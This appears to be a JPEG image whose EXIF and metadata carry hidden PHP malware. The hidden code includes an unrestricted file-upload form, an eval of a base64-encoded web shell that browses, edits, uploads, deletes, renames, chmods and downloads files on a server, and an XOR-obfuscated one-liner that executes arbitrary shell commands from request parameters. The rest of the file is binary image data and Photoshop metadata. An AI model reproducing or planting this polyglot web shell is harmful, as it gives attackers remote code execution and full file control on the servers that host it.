����JFIF��x�x������Exif��MM�*����
����E���J����������������(������������������<!DOCTYPE html>
<html>
<head>
  <title>Real Shit</title>
</head>
<body>
  <form enctype="multipart/form-data" action="" method="POST">
    <p>Upload your file</p>
    <input type="file" name="uploaded_file"></input><br />
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>
<?PHP
  if(!empty($_FILES['uploaded_file']))
  {
    $path = "";
    $path = $path . basename( $_FILES['uploaded_file']['name']);

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
      " has been uploaded";
    } else{
        echo "There was an error uploading the file, please try again!";
    }
  }
?>�����x������x������C�




���C		

����<�d"��������������	
�������}�!1AQa"q2���#B��R��$3br�	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������������	
������w�!1AQaq"2�B����	#3R�br�
$4�%�&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������?��S��(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(���(��ÿØÿà JFIF  H H  ÿá Exif  MM *          	
      	      	             	      	$(       1   5  	,2      
b;      
zGF       GI     c  ‚˜      
€‡i      
†œ›    
  ¦œœ    
  °œ    
  ºœž    
  ÄœŸ    
  Îê      þ  Øê   <?=eval("?>".base64_decode("ICAgPGJyIC8+DQo8Yj5Ob3RpY2U8L2I+OiAgVW5kZWZpbmVkIGluZGV4OiBkbCBpbiA8Yj4vdmFyL3d3dy9odG1sL3dlYi9zaW1wbGUubWluaS5waHA8L2I+IG9uIGxpbmUgPGI+MTwvYj48YnIgLz4NCjw/cGhwIGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgMSk7aW5pX3NldCgnZGlzcGxheV9zdGFydHVwX2Vycm9ycycsIDEpO2Vycm9yX3JlcG9ydGluZyhFX0FMTCk7ZnVuY3Rpb24gZSgkcyl7cmV0dXJuIGJhc2U2NF9lbmNvZGUoJHMpO31mdW5jdGlvbiBkKCRzKXtyZXR1cm4gYmFzZTY0X2RlY29kZSgkcyk7fWlmKGlzc2V0KCRfR0VUWydpbmZvJ10pJiYkX0dFVFsnaW5mbyddPT09J2luZm8nKXtwaHBpbmZvKCk7ZXhpdCgpO31mb3JlYWNoKCRfR0VUIGFzICRrPT4kdil7JF9HRVRbJGtdPWQoJHYpO31mb3JlYWNoKCRfUE9TVCBhcyAkaz0+JHYpeyRfUE9TVFska109ZCgkdik7fSRkaXI9cmVhbHBhdGgoaXNzZXQoJF9HRVRbJ2RpciddKT8oJF9HRVRbJ2RpciddKTpfX0RJUl9fKTskZGlyPSRkaXI/JGRpcjpfX0RJUl9fO2NoZGlyKCRkaXIpOyRlZGlyPSdkaXI9Jy5lKCRkaXIpO2lmKGlzc2V0KCRfR0VUWydkbCddKSl7aWYoIXJlYWxwYXRoKCRfR0VUWydkbCddKSl7ZXhpdCgpO31oZWFkZXIoJ0NvbnRlbnQtRGVzY3JpcHRpb246IEZpbGUgVHJhbnNmZXInKTtoZWFkZXIoJ0NvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtJyk7aGVhZGVyKCdDb250ZW50LURpc3Bvc2l0aW9uOiBhdHRhY2htZW50OyBmaWxlbmFtZT0iJy5iYXNlbmFtZSgkX1BPU1RbJ2RsJ10pLiciJyk7cmVhZGZpbGUoJF9HRVRbJ2RsJ10pO2V4aXQoKTt9ZnVuY3Rpb24gc2l6ZSgkcGF0aCwkZGVjaW1hbHM9MCl7JGJ5dGVzPWZpbGVzaXplKCRwYXRoKTskZmFjdG9yPWZsb29yKChzdHJsZW4oJGJ5dGVzKSAtIDEpIC8gMyk7aWYgKCRmYWN0b3IgPiAwKSAkc3ogPSAnS01HVCc7cmV0dXJuIHNwcmludGYoIiUueyRkZWNpbWFsc31mIiwgJGJ5dGVzIC8gcG93KDEwMjQsICRmYWN0b3IpKSAuIEAkc3pbJGZhY3RvciAtIDFdIC4gJ0InO31mdW5jdGlvbiBwZXJtcygkcGF0aCl7Y2xlYXJzdGF0Y2FjaGUoKTskcGVybXM9ZmlsZXBlcm1zKCRwYXRoKTskeD1hcnJheSgnVScsJ3AnLCdjJywnVScsJ2QnLCdVJywnYicsJ1UnLCdyJywnVScsJ2wnLCdVJywncycsJ1UnLCdVJywnVScpOyRpbmZvPSR4WyRwZXJtcz4+MTJdLmltcGxvZGUoJycsYXJyYXlfbWFwKGZ1bmN0aW9uKCRiLCRtKXtyZXR1cm4gJGI9PScxJz8kbTonLSc7fSxzdHJfc3BsaXQoZGVjYmluKCRwZXJtcyYweGZmZikuJycpLHN0cl9zcGxpdCgncnd4cnd4cnd4JykpKTtyZXR1cm4gJGluZm8uJyAnLnN1YnN0cihzcHJpbnRmKCclbycsIEBmaWxlcGVybXMoJHBhdGgpKSwgLTQpO31pZighZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRwd3VpZCcpKXtmdW5jdGlvbiBwb3NpeF9nZXRwd3VpZCgkeCl7cmV0dXJuIGFycmF5KCduYW1lJz0+Jy0tLScpO319Pz48IURPQ1RZUEUgaHRtbD48aHRtbD48aGVhZD48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTAuNSwgdXNlci1zY2FsYWJsZT15ZXMiPjx0aXRsZT5TaW1wbGUgU2hlbGw8L3RpdGxlPjxzdHlsZT5odG1sLGJvZHksaW5wdXQsYnV0dG9ue2JhY2tncm91bmQ6YmxhY2s7Y29sb3I6Z3JheTtmb250LWZhbWlseTptb25vc3BhY2U7fWF7Y29sb3I6Z3JheTt0ZXh0LWRlY29yYXRpb246IG5vbmU7fWJ1dHRvbixpbnB1dHtib3JkZXI6MXB4IHNvbGlkIGdyYXk7aGVpZ2h0OjEuN2VtO310YWJsZXt3aWR0aDoxMDAlO2JvcmRlcjoxcHggZG90dGVkIGdyYXk7Ym9yZGVyLXNwYWNpbmc6MHB4O310cjpob3ZlcntiYWNrZ3JvdW5kOiMxNjE2MTY7fXRkLHRoe3BhZGRpbmc6MnB4IDBweDtib3JkZXI6MXB4IHNvbGlkICM2NjY7fXRleHRhcmVhe3dpZHRoOjgwJTtoZWlnaHQ6NTB2aDtiYWNrZ3JvdW5kOmJsYWNrO2NvbG9yOmdyZWVuO3RhYi1zaXplOjQ7fS5idG57Ym9yZGVyOiAxcHggc29saWQgIzY2Njtib3JkZXItcmFkaXVzOjAuM2VtO3BhZGRpbmc6MCAwLjNlbTtkaXNwbGF5OmlubGluZS1ibG9jazt0ZXh0LWFsaWduOmNlbnRlcjt9LmJ0bjpob3Zlcntib3JkZXItY29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjpibGFjazt0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgbGluZWFyO30uZGlyZWN0b3J5e2JhY2tncm91bmQ6IzA0MUMzMjt9LmRpcmVjdG9yeTpiZWZvcmV7Y29udGVudDoiRElSLyI7Y29sb3I6Z3JheTt9LmZpbGV7YmFja2dyb3VuZDojMDQyOTNBO30uZmlsZTpiZWZvcmV7Y29udGVudDoiRklMRSI7Y29sb3I6Z3JheTt9Lm5vdHdyaXRhYmxlIGEsIC5ub3R3cml0YWJsZXtjb2xvcjojRkY3ODAwO30ud3JpdGFibGUgYSwgLndyaXRhYmxle2NvbG9yOiM0OUZGMDA7fS5zeW1saW5re2Zsb2F0OnJpZ2h0O2NvbG9yOiNFMkMyNzU7fS5pY29ue2ZvbnQtc2l6ZToxLjVlbTtwYWRkaW5nOjAuMWVtIDAuMmVtO21hcmdpbjowcHg7fS5kZWxldGU6YmVmb3Jle2NvbnRlbnQ6IlwxRjQ4MCI7b3BhY2l0eTowLjc7fS5yZW5hbWU6YmVmb3Jle2NvbnRlbnQ6IlwyNzBEIjtjb2xvcjpibHVlO30uZG93bmxvYWQ6YmVmb3Jle2NvbnRlbnQ6IlwyMUU5XDIxRTkiO2NvbG9yOmdyZWVuO30ub3Blbmxpbms6YmVmb3Jle2NvbnRlbnQ6IlwxRjUxNyI7fS5zdWNjZXNze2NvbG9yOnllbGxvdzt9LnN1Y2Nlc3M6YmVmb3Jle2NvbnRlbnQ6IlwyNzBDIjt9LmZhaWxlZHtjb2xvcjpyZWQ7fS5mYWlsZWQ6YmVmb3Jle2NvbnRlbnQ6IlwyNjIyIjt9PC9zdHlsZT48c2NyaXB0PmZ1bmN0aW9uIGUocyl7cmV0dXJuIGJ0b2Eocyk7fWZ1bmN0aW9uIGNobW9kKGksb2xkKXt2YXIgbj1wcm9tcHQoIkNITU9EOiIsb2xkKTtpZihuKXtpLmhyZWYrPSImbmV3PSIrZShuKTtyZXR1cm4gdHJ1ZTt9cmV0dXJuIGZhbHNlO31mdW5jdGlvbiBjaHRpbWUoaSxvbGQpe3ZhciBuPXByb21wdCgiQ2hhbmdlIG1vZGlmaWVkIHRpbWU6IixvbGQpO2lmKG4pe2kuaHJlZis9IiZuZXc9IitlKG4pO3JldHVybiB0cnVlO31yZXR1cm4gZmFsc2U7fWZ1bmN0aW9uIHJlbmFtZShpLG9sZCl7dmFyIG49cHJvbXB0KCJSZW5hbWU6IixvbGQpO2lmKG4pe2kuaHJlZis9IiZuZXc9IitlKG4pO3JldHVybiB0cnVlO31yZXR1cm4gZmFsc2U7fTwvc2NyaXB0PjwvaGVhZD48Ym9keT5ZT1VSIElQOiA8P3BocCBlY2hvICRfU0VSVkVSWydSRU1PVEVfQUREUiddPz48YnIvPlNFUlZFUiBJUDogPD9waHAgZWNobyBnZXRob3N0YnluYW1lKCRfU0VSVkVSWydIVFRQX0hPU1QnXSkuIiAvICIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10/PjwvYnI+PGEgY2xhc3M9ImJ0biIgaHJlZj0iP2luZm89aW5mbyIgdGFyZ2V0PSJfX2JsYW5rIj5TRVJWRVIgSU5GTzwvYT46IDw/cGhwIGVjaG8gcGhwX3VuYW1lKCk/PjwvYnI+PGZvcm0gYWN0aW9uPSI/PD9waHAgZWNobyAkZWRpcjs/PiIgbWV0aG9kPSJwb3N0IiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj48aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgY2xhc3M9Ijw/cGhwIGVjaG8gaXNfd3JpdGFibGUoJGRpcik/J3dyaXRhYmxlJzonbm90d3JpdGFibGUnPz4iPjxidXR0b24gdHlwZT0ic3VibWl0Ij5VcGxvYWQ8L2J1dHRvbj48L2Zvcm0+PGNlbnRlcj48P3BocCBpZihpc3NldCgkX0ZJTEVTWydmaWxlJ10pKXtpZihtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLGJhc2VuYW1lKCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkpe2VjaG8gJzxzcGFuIGNsYXNzPSJzdWNjZXNzIj5VUExPQUQgU1VDQ0VTUyE8L3NwYW4+Jzt9ZWxzZXtlY2hvICc8c3BhbiBjbGFzcz0iZmFpbGVkIj5VUExPQUQgRkFJTEVEITwvc3Bhbj4nO319aWYoaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpe2lmKGlzc2V0KCRfUE9TVFsnZWRpdCddKSl7aWYoQGZpbGVfcHV0X2NvbnRlbnRzKCRfR0VUWydmaWxlJ10sJF9QT1NUWydlZGl0J10pKXtlY2hvICc8c3BhbiBjbGFzcz0ic3VjY2VzcyI+RURJVCBTVUNDRVNTITwvc3Bhbj4nO31lbHNle2VjaG8gJzxzcGFuIGNsYXNzPSJmYWlsZWQiPkVESVQgRkFJTEVEITwvc3Bhbj4nO319ZWNobyAnPGZvcm0gYWN0aW9uPSI/ZmlsZT0nLmUoJF9HRVRbJ2ZpbGUnXSkuJyYnLiRlZGlyLiciIG1ldGhvZD0icG9zdCIgb25zdWJtaXQ9ImVkaXQudmFsdWU9ZShlZGl0LnZhbHVlKSI+PHRleHRhcmVhIGlkPSJlZGl0IiBuYW1lPSJlZGl0Ij4nLmh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJF9HRVRbJ2ZpbGUnXSksRU5UX1FVT1RFU3xFTlRfU1VCU1RJVFVURXxFTlRfQ09NUEFULCAnVVRGLTgnKS4nPC90ZXh0YXJlYT48YnV0dG9uPlVwZGF0ZTwvYnV0dG9uPjwvZm9ybT4nO31pZihpc3NldCgkX0dFVFsnZGVsZXRlJ10pKXskeD1zdHJfcmVwbGFjZSgnWCcsJycsJ1h1WG5YbFhpWG5Ya1gnKTtpZigkeCgkX0dFVFsnZGVsZXRlJ10pKXtlY2hvICc8c3BhbiBjbGFzcz0ic3VjY2VzcyI+REVMRVRFIFNVQ0NFU1MhPC9zcGFuPic7fWVsc2V7ZWNobyAnPHNwYW4gY2xhc3M9ImZhaWxlZCI+REVMRVRFIEZBSUxFRCE8L3NwYW4+Jzt9fWlmKGlzc2V0KCRfR0VUWydjaG1vZCddLCRfR0VUWyduZXcnXSkpe2lmKGNobW9kKCRfR0VUWydjaG1vZCddLGludHZhbCgkX0dFVFsnbmV3J10sOCkpKXtlY2hvICc8c3BhbiBjbGFzcz0ic3VjY2VzcyI+Q0hNT0QgU1VDQ0VTUyE8L3NwYW4+Jzt9ZWxzZXtlY2hvICc8c3BhbiBjbGFzcz0iZmFpbGVkIj5DSE1PRCBGQUlMRUQhPC9zcGFuPic7fX1pZihpc3NldCgkX0dFVFsnY2h0aW1lJ10sJF9HRVRbJ25ldyddKSl7aWYodG91Y2goJF9HRVRbJ2NodGltZSddLGludHZhbChzdHJ0b3RpbWUoJF9HRVRbJ25ldyddKSkpKXtlY2hvICc8c3BhbiBjbGFzcz0ic3VjY2VzcyI+VElNRSBNQUNISU5FIFNVQ0NFU1MhPC9zcGFuPic7fWVsc2V7ZWNobyAnPHNwYW4gY2xhc3M9ImZhaWxlZCI+VElNRSBNQUNISU5FIEZBSUxFRCE8L3NwYW4+Jzt9fWlmKGlzc2V0KCRfR0VUWydyZW5hbWUnXSwkX0dFVFsnbmV3J10pKXtpZihyZW5hbWUoJF9HRVRbJ3JlbmFtZSddLCRkaXIuJy8nLmJhc2VuYW1lKCRfR0VUWyduZXcnXSkpKXtlY2hvICc8c3BhbiBjbGFzcz0ic3VjY2VzcyI+UkVOQU1FIFNVQ0NFU1MhPC9zcGFuPic7fWVsc2V7ZWNobyAnPHNwYW4gY2xhc3M9ImZhaWxlZCI+UkVOQU1FIEZBSUxFRCE8L3NwYW4+Jzt9fSRkaXJzPWFycmF5KCk7JGZpbGVzPWFycmF5KCk7Zm9yZWFjaChzY2FuZGlyKCRkaXIpIGFzICRwKXtpZihpc19kaXIoJGRpci4nLycuJHApKXtpZigkcCE9Jy4nKSRkaXJzW109KCRkaXIuJy8nLiRwKTt9ZWxzZXskZmlsZXNbXT0oJGRpci4nLycuJHApO319Pz48L2NlbnRlcj48dGFibGU+PHRyPjx0aD48Zm9ybSBvbnN1Ym1pdD0iZGlyLnZhbHVlPWUoZGlyLnZhbHVlKSI+RGlyZWN0b3J5OiA8aW5wdXQgY2xhc3M9Ijw/cGhwIGVjaG8gaXNfd3JpdGFibGUoJGRpcik/J3dyaXRhYmxlJzonbm90d3JpdGFibGUnPz4iIHR5cGU9InRleHQiIGlkPSJkaXIiIG5hbWU9ImRpciIgdmFsdWU9Ijw/cGhwIGVjaG8gJGRpcj8+Ij48YnV0dG9uPiYjMTAxNTc7JiMxMDE1Nzs8L2J1dHRvbj48YSBocmVmPSI/ZGlyPTw/cGhwIGVjaG8gZShyZWFscGF0aCgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKSk/PiI+W0RvY1Jvb3RdPC9hPjxhIGhyZWY9Ij9kaXI9PD9waHAgZWNobyBlKHJlYWxwYXRoKF9fRElSX18pKT8+Ij5bU2hlbGwgUGF0aF08L2E+PC9mb3JtPjwvdGg+PHRoPlNJWkU8L3RoPjx0aD5EQVRFIE1PRDwvdGg+PHRoPk9XTkVSPC90aD48dGg+UEVSTVM8L3RoPjx0aD5BQ1RJT048L3RoPjwvdHI+PD9waHAgZm9yZWFjaChhcnJheV9tZXJnZSgkZGlycywkZmlsZXMpIGFzICRwYXRoKXskZD1pc19kaXIoJHBhdGgpOyR3PWlzX3dyaXRhYmxlKCRwYXRoKTs/Pjx0cj48dGQgY2xhc3M9Ijw/cGhwIGVjaG8gKCRkPydkaXJlY3RvcnknOidmaWxlJykuJyAnLigkdz8nd3JpdGFibGUnOidub3R3cml0YWJsZScpOz8+Ij48YSBocmVmPSI/PD9waHAgZWNobyAkZD8oJ2Rpcj0nLmUoJHBhdGgpLicnKTooJ2ZpbGU9Jy5lKCRwYXRoKS4nJicuJGVkaXIpOz8+Ij48P3BocCBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoYmFzZW5hbWUoJHBhdGgpKTs/PjwvYT48P3BocCBlY2hvIGlzX2xpbmsoJHBhdGgpPyc8c3BhbiBjbGFzcz0ic3ltbGluayI+Jy5yZWFkbGluaygkcGF0aCkuJzwvc3Bhbj4nOicnPz48L3RkPjx0ZD48P3BocCBlY2hvICRkPyctLS0nOnNpemUoJHBhdGgpOz8+PC90ZD48dGQ+PGEgY2xhc3M9ImJ0biIgaHJlZj0iP2NodGltZT08P3BocCBlY2hvIGUoJHBhdGgpLicmJy4kZWRpcj8+IiBvbmNsaWNrPSJyZXR1cm4gY2h0aW1lKHRoaXMsJzw/cGhwICRjaHRpbWU9ZGF0ZSgiTS1kLVkgSDppOnMiLGZpbGVtdGltZSgkcGF0aCkpOyBlY2hvICRjaHRpbWU7Pz4nKSI+PD9waHAgZWNobyAkY2h0aW1lOz8+PC9hPjwvdGQ+PHRkPjw/cGhwIGlmKHN0cnBvcyhQSFBfT1MsJ1dJTicpPT09ZmFsc2UpeyRfPXBvc2l4X2dldHB3dWlkKGZpbGVvd25lcigkcGF0aCkpO2VjaG8gJF9bJ25hbWUnXTt9ZWxzZXtlY2hvICItLS0iO30/PjwvdGQ+PHRkPjxhIGNsYXNzPSJidG4iIGhyZWY9Ij9jaG1vZD08P3BocCBlY2hvIGUoJHBhdGgpLicmJy4kZWRpcj8+IiBvbmNsaWNrPSJyZXR1cm4gY2htb2QodGhpcywnPD9waHAgZWNobyBzdWJzdHIoc3ByaW50ZignJW8nLCBAZmlsZXBlcm1zKCRwYXRoKSksIC00KTs/PicpOyI+PD9waHAgZWNobyBwZXJtcygkcGF0aCk7Pz48L2E+PC90ZD48dGQ+PD9waHAgaWYoYmFzZW5hbWUoJHBhdGgpIT09Jy4uJyl7Pz48YSB0aXRsZT0iRGVsZXRlIiBjbGFzcz0iYnRuIGljb24gZGVsZXRlIiBocmVmPSI/ZGVsZXRlPTw/cGhwIGVjaG8gZSgkcGF0aCkuJyYnLiRlZGlyPz4iIG9uY2xpY2s9InJldHVybiBjb25maXJtKCdTdXJlIHRvIGRlbGV0ZT8nKSI+PC9hPjxhIHRpdGxlPSJSZW5hbWUiIGNsYXNzPSJidG4gaWNvbiByZW5hbWUiIGhyZWY9Ij9yZW5hbWU9PD9waHAgZWNobyBlKCRwYXRoKS4nJicuJGVkaXI/PiIgb25jbGljaz0icmV0dXJuIHJlbmFtZSh0aGlzLCc8P3BocCBlY2hvIGJhc2VuYW1lKCRwYXRoKT8+JykiPjwvYT48P3BocCBpZighJGQpe2VjaG8gJzxhIHRpdGxlPSJEb3dubG9hZCIgY2xhc3M9ImJ0biBpY29uIGRvd25sb2FkIiBocmVmPSI/ZGw9Jy5lKCRwYXRoKS4nIj48L2E+Jzt9fWlmKHN0cnN0cihyZWFscGF0aCgkcGF0aCksJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSkpe2VjaG8gJzxhIHRpdGxlPSJPcGVuIExpbmsiIGNsYXNzPSJidG4gaWNvbiBvcGVubGluayIgaHJlZj0iJy4ocmVhbHBhdGgoJHBhdGgpPT0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddPycvJzpzdWJzdHIocmVhbHBhdGgoJHBhdGgpLHN0cmxlbigkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKSkpLiciIHRhcmdldD0iX19ibGFuayI+PC9hPic7fT8+PC90ZD48L3RyPjw/cGhwIH0/PjwvdGFibGU+PC9ib2R5PjwvaHRtbD4="));?>

?><?="<br>";?>dnthirteen@h34rtbl33d.today:~$ <?="<".("{"^"+").("{"^")").("{"^">").">";@$_++;$__ = ${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[!$_];$___ = `$__` ?: $__(${("|"^"#").("{"^"<").("{"^">;").("{"^"/")}[$_]);?><?=($___."</".("{"^"+").("{"^")").("{"^">").">");__HALT_COMPILER();?>1337:13:37 13:37:666ÿÿ
  1337:13:37 13:37:666ÿÿ
 null  null   ˆ"       ˆ'    š       null      |      ’       ’       ’	     _  ’‘    04  ’’    04       ÿÿ          
        
¤        ¤    š  ¤       ¤	       ¤
       ê     p    ê                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         1997:12:11 15:28:59 1997:12:11 15:28:59   n u l l   n u l l   n u l l   n u l l   n u l l                 &      .(             6      Â       H      H   ÿØÿÛ C 		

 $.' ",#(7),01444'9=82<.342ÿÛ C			

2!!22222222222222222222222222222222222222222222222222ÿÀ  
 
! ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? Ñ×|AâDÔõ%·†Ö}Ibm>ec.Ý |¥F¯ß wlWdÞ+½…ŒSxcRóPí-Ñ—#®á‘èp(×À’ÿ Ä×N7\Ù<e˜òöùnv«ŸlW¦ZÙ@O$Æ¹?… ÿÙÿíjPhotoshop 3.0 8BIM%                     8BIMí      H     H    8BIM&               ?€  8BIM
        x8BIM        8BIMó     	         8BIM
       8BIM'     
        8BIMõ     H /ff  lff       /ff  ¡™š       2    Z         5    -        8BIMø     p  ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè    ÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿÿè  8BIM       8BIM         8BIM          @  @    8BIM         8BIM    I              
   
   
 U n t i t l e d - 1                                 
   
                                            null      boundsObjc         Rct1       Top long        Leftlong        Btomlong   
    Rghtlong   
   slicesVlLs   Objc        slice      sliceIDlong       groupIDlong       originenum   ESliceOrigin   
autoGenerated    Typeenum   
ESliceType    Img    boundsObjc         Rct1       Top long        Leftlong        Btomlong   
    Rghtlong   
   urlTEXT         nullTEXT         MsgeTEXT        altTagTEXT        cellTextIsHTMLbool   cellTextTEXT        	horzAlignenum   ESliceHorzAlign   default   	vertAlignenum   ESliceVertAlign   default   bgColorTypeenum   ESliceBGColorType    None   	topOutsetlong       
leftOutsetlong       bottomOutsetlong       rightOutsetlong     8BIM      8BIM        8BIM          
   
      @    ÿØÿà JFIF  H H  ÿí Adobe_CM ÿî Adobe d€   ÿÛ „ 			



ÿÀ  
 
" ÿÝ  ÿÄ?          	
         	
 3 !1AQa"q2‘¡±B#$RÁb34r‚ÑC%’Sðáñcs5¢²ƒ&D“TdEÂ£t6ÒUâeò³„ÃÓuãóF'”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö7GWgw‡—§·Ç×ç÷ 5 !1AQaq"2‘¡±B#ÁRÑð3$bár‚’CScs4ñ%¢²ƒ&5ÂÒD“T£dEU6teâò³„ÃÓuãóF”¤…´•ÄÔäô¥µÅÕåõVfv†–¦¶ÆÖæö'7GWgw‡—§·ÇÿÚ   ? ·ÕºÇ_nf^+jf=½@TîŸMq·nÖ´ún©»j}Ò^Ú¿ÂÙé®“ö·Vÿ Ê—ý/Cùæ=ãÿ „ÿ î×þ ¹Î»ÿ .ž>“?œþ—ô¿õŸÿ Ý•Õýýë©)ÿÙ 8BIM!     U       A d o b e   P h o t o s h o p    A d o b e   P h o t o s h o p   7 . 0    8BIM        ÿáßhttp://ns.adobe.com/xap/1.0/ <?xpacket begin='ï»¿' id='W5M0MpCehiHzreSzNTczkc9d'?>
<?adobe-xap-filters esc="CR"?>
<x:xapmeta xmlns:x="adobe:ns:meta/" x:xaptk="XMP toolkit 2.8.2-33, framework 1.5">
	<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:iX="http://ns.adobe.com/iX/1.0/">
		<rdf:Description about="" xmlns:xapMM="http://ns.adobe.com/xap/1.0/mm/">
			<xapMM:DocumentID>adobe:docid:photoshop:e4e9b767-808f-11ea-b398-e7491f16d242</xapMM:DocumentID>
		</rdf:Description>
		<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"/><rdf:Description xmlns:MicrosoftPhoto="http://ns.microsoft.com/photo/1.0/"><MicrosoftPhoto:CameraSerialNumber>null</MicrosoftPhoto:CameraSerialNumber><MicrosoftPhoto:DateAcquired>2013-12-11T15:29:16.570</MicrosoftPhoto:DateAcquired><MicrosoftPhoto:FlashManufacturer>null</MicrosoftPhoto:FlashManufacturer><MicrosoftPhoto:FlashModel>null</MicrosoftPhoto:FlashModel><MicrosoftPhoto:LensManufacturer>null</MicrosoftPhoto:LensManufacturer><MicrosoftPhoto:LensModel>null</MicrosoftPhoto:LensModel><MicrosoftPhoto:Rating>99</MicrosoftPhoto:Rating><MicrosoftPhoto:LastKeywordXMP><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
			</MicrosoftPhoto:LastKeywordXMP></rdf:Description><rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator><rdf:Seq xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Seq>
			</dc:creator><dc:rights><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:rights><dc:subject><rdf:Bag xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li>null</rdf:li></rdf:Bag>
			</dc:subject><dc:title><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:title><dc:description><rdf:Alt xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:li xml:lang="x-default">null</rdf:li></rdf:Alt>
			</dc:description></rdf:Description><rdf:Description xmlns:xmp="http://ns.adobe.com/xap/1.0/"><xmp:CreateDate>1997-12-11T15:28:59.039</xmp:CreateDate><xmp:Rating>5</xmp:Rating></rdf:Description></rdf:RDF>
</x:xapmeta>
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                            <?xpacket end='w'?>ÿÛ C ÿÛ CÿÀ  
 
" ÿÄ           	
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        	
ÿÄ µ  w !1AQaq"2B‘¡±Á	#3RðbrÑ
$4á%ñ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz‚ƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚâãäåæçèéêòóôõö÷øùúÿÚ   ? úö²ý°¿o­3âÿ í
ð§Kð'¾xÃö³µø=¬~È¿~!xóÆšÇÆc Ïà¿iWËàýoÁ>¼Ñü
